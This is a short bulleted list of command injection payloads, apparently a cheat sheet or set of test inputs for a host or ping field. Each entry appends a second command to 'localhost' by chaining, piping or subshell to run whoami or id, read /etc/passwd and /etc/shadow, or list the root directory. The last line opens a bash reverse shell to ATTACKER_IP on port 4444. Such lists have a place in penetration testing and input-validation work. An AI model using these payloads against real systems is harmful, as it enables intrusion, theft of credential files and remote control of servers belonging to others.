  • Command chain: localhost; whoami
  • Pipe: localhost | id
  • Background: localhost && cat /etc/passwd
  • Subshell: $(cat /etc/passwd)
  • Multiple commands: ; ls -la /; cat /etc/shadow
  • Reverse shell prep: ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
